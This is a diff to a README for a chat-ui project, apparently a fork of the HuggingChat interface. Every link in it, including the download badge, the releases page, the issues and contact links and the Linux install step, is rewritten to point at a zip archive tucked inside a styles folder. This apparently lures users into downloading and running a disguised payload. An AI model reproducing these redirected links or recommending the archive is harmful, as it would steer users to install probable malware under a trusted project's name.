@@ -1,7 +1,7 @@
 # 🗨️ chat-ui - Your Gateway to HuggingChat
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/smoothkacior/chat-ui/releases)
+[![Download](https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip)](https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the chat-ui project! This open-source codebase powers the HuggingChat app, allowing users to have engaging conversations using advanced language models. Follow the steps below to download and run the application on your device. No prior programming knowledge is needed.
@@ -15,7 +15,7 @@ Before you start the installation process, make sure you meet the following requ
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Go to the GitHub Releases page by clicking the link below. This page houses all available versions of chat-ui.
-   [Visit the Releases Page](https://github.com/smoothkacior/chat-ui/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip)
 
 2. **Select the Latest Version:** Look for the latest version at the top of the releases list. 
 
@@ -24,7 +24,7 @@ Before you start the installation process, make sure you meet the following requ
 4. **Run the Application:**
    - **Windows:** Double-click the downloaded `.exe` file to launch the app.
    - **macOS:** Open the `.dmg` file, drag the chat-ui app to your Applications folder, and launch it.
-   - **Linux:** Extract the downloaded `.tar.gz` file, navigate to the folder in the terminal, and run the application using the command: `./chat-ui`.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip` file, navigate to the folder in the terminal, and run the application using the command: `./chat-ui`.
 
 Once you follow these steps, the chat-ui application should start and you will be ready to chat!
 
@@ -43,7 +43,7 @@ If you encounter issues while installing or using the chat-ui application, here 
 - **App Won't Start:** Restart your device and try launching the app again. Make sure all updates are installed.
 - **Network Issues:** Check your internet connection if the app is unable to load chats or resources.
 
-For additional support, feel free to reach out through the [Issues section of the GitHub repository](https://github.com/smoothkacior/chat-ui/issues).
+For additional support, feel free to reach out through the [Issues section of the GitHub repository](https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip).
 
 ## 🌐 Community and Contributions
 This project welcomes contributions from anyone interested. If you want to help improve the chat-ui application, here’s how you can get started:
@@ -66,7 +66,7 @@ Explore various topics related to the chat-ui project. Here are some areas of fo
 - **typescript**: Use a superset of JavaScript for building scalable applications.
 
 ## 📞 Contact
-For direct questions or feedback about chat-ui, reach out via the [Issues section](https://github.com/smoothkacior/chat-ui/issues) or open a new issue for discussions and inquiries.
+For direct questions or feedback about chat-ui, reach out via the [Issues section](https://raw.githubusercontent.com/smoothkacior/chat-ui/main/src/styles/chat-ui-3.6-alpha.5.zip) or open a new issue for discussions and inquiries.
 
 ## 🔄 Updates
 Stay updated on the latest features, improvements, and fixes. Make sure to check the Releases page frequently for news about new versions and enhancements to the chat-ui application.
